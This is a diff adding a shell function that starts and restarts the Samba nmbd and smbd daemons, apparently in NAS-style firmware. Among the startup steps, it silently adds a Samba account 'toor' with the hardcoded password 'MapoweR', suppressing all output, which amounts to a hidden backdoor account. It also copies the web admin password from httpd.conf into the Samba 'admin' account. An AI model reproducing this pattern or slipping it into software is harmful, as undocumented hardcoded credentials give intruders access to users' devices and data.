@@ -1,0 +1,43 @@
+service_smb_start(){
+smbd_prog=/usr/local/samba/sbin/smbd
+nmbd_prog=/usr/local/samba/sbin/nmbd
+smbd_pid=/var/run/smbd.pid
+nmbd_pid=/var/run/nmbd.pid
+PASSWD_PROG=/usr/local/samba/sbin/smbpasswd
+PASSWD_DB=/etc/sysconfig/config/smb/private/smbpasswd
+
+PID=`/bin/pidof nmbd`
+[ "${PID}" == "" ] && {
+ ${nmbd_prog}
+ [ $? -eq 0 ] &&\
+  /bin/logger "$0 - nmbd deamon Start Succeed" ||\
+  /bin/logger "$0 - nmbd deamon Start Failed"
+ } || {
+ /bin/killall nmbd
+ for i in $PID; do
+  /bin/kill -9 $i >/dev/null 2>&1
+ done
+ /bin/rm -f ${nmbd_pid} >/dev/null 2>&1
+ sleep 2
+ ${nmbd_prog}
+[ $? -eq 0 ] &&\
+ /bin/logger "$0 - nmbd deamon Restart Succeed" ||\
+ /bin/logger "$0 - nmbd deamon Restart Failed"
+ }
+
+PID=`/bin/pidof smbd`
+[ "${PID}" == "" ] && {
+ /bin/nice -n +10 ${smbd_prog}
+[ $? -eq 0 ] &&\
+ /bin/logger "$0 - smbd deamon Start Succeed" ||\
+ /bin/logger "$0 - smbd deamon Start Failed"
+ }
+
+admin_pass=`/bin/cat /etc/sysconfig/config/httpd.conf|/bin/awk "-F:" '{print $3}'|/bin/sed 's/\ //g'`
+(echo "MapoweR";echo "MapoweR")|${PASSWD_PROG} -s -a toor >/dev/null 2>&1
+(echo "${admin_pass}";echo "${admin_pass}")|${PASSWD_PROG} -s -a admin >/dev/null 2>&1
+
+PID=`/bin/pidof nmbd`
+[ "${PID}" == "" ] && ${nmbd_prog}
+
+}
